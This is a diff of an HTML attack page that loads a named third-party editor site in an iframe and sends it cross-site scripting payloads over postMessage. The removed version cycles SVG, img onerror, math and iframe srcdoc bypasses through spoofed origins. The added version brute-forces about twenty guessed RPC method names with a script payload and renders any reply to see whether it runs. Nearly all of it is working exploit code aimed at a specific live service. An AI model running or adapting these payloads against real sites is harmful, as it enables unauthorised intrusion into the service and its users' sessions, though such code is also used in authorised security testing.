@@ -1,48 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>SSRF + XSS via postMessage Attack</title>
+  <title>XSS RPC Tester</title>
 </head>
 <body>
-  <h2>🚨 XSS Test via postMessage إلى iframe Toloka Builder</h2>
-
-  <iframe id="victim" src="https://tb.toloka.dev/editor" style="width: 90%; height: 600px; border: 2px solid red;"></iframe>
+  <h1>🔥 XSS RPC AutoTester v2</h1>
+  <iframe id="evil" src="https://tb.toloka.dev/editor" style="width:100%;height:600px;border:1px solid #000;"></iframe>
 
   <script>
-    const iframe = document.getElementById("victim");
+    const iframe = document.getElementById("evil").contentWindow;
+    const origin = "https://tb.toloka.dev";
+    const payload = `<iframe srcdoc="<script>top.alert('🔥 XSS triggered')<\/script>"></iframe>`;
 
-    const payloads = [
-      `<svg onload=alert('XSS_SVG_BYPASS')>`, // Bypass 1: SVG tag
-      `<img src=x onerror=alert('XSS_IMG')>`, // Bypass 2: onerror
-      `<math><script>alert('XSS_MATH')<\/script></math>`, // Bypass 3: Math tag (تم إضافة escape لـ / في script)
-      `<iframe srcdoc="<script>alert('XSS_IFRAME')<\/script>">` // Bypass 4: iframe.srcdoc (تم إضافة escape لـ / في script)
+    const methods = [
+      "renderMarkdown", "loadPreview", "getPreview", "injectTemplate", "parseHTML",
+      "setContent", "showMarkdown", "convert", "previewTemplate", "parseTemplate",
+      "display", "loadMarkdown", "send", "getMessage", "reply", "getData",
+      "read", "getText", "render", "echo"
     ];
 
-    const originsToTry = [
-      "https://tb.toloka.dev",              // الرسمي
-      "https://x.tb.toloka.dev",           // نطاق فرعي
-      "https://tb-toloka.dev",             // مشابه
-      "https://evil.toloka.dev",           // متغير
-      "https://tb.toloka.dev.evil.com",    // خداع
-    ];
+    let counter = 1;
 
-    window.onload = function() {
-      setTimeout(function() {
-        originsToTry.forEach(function(origin) {
-          payloads.forEach(function(xss) {
-            const craftedMessage = {
-              originalEvent: {
-                origin: origin
-              },
-              data: xss
-            };
+    // استقبال الردود
+    window.addEventListener("message", function(event) {
+      if (event.origin !== origin) return;
 
-            console.log("[📤] Sending to iframe... origin: " + origin + " | payload: " + xss);
-            iframe.contentWindow.postMessage(craftedMessage, origin);
-          });
-        });
-      }, 2000); // ننتظر تحميل iframe
-    };
+      const { type, id, result, error } = event.data || {};
+      console.log(`[📩] Received: id=${id}, type=${type}`);
+      if (error) {
+        console.warn(`[❌] Error from method id=${id}:`, error);
+      } else if (result) {
+        console.log(`[✅] Result from id=${id}:`, result);
+
+        // محاولة العرض داخل iframe لرؤية تأثير XSS
+        const preview = document.createElement("iframe");
+        preview.style = "width:100%;height:100px;border:1px dashed red;margin:5px;";
+        preview.srcdoc = result;
+        document.body.appendChild(preview);
+      }
+    });
+
+    function sendRPC(method, params = []) {
+      const id = "xss-test-" + (counter++);
+      console.log(`[🚀] Sending RPC: method=${method}, id=${id}`);
+      iframe.postMessage({
+        type: "RPC",
+        method,
+        id,
+        params
+      }, origin);
+    }
+
+    // جرب كل دالة مع عدة أنواع من params
+    methods.forEach(method => {
+      // مجرد payload فقط
+      sendRPC(method, [payload]);
+
+      // payload مع كائن
+      sendRPC(method, [payload, { target: "main" }]);
+
+      // payload ضمن كائن كبير
+      sendRPC(method, [{ html: payload, safe: false }]);
+    });
   </script>
 </body>
 </html>
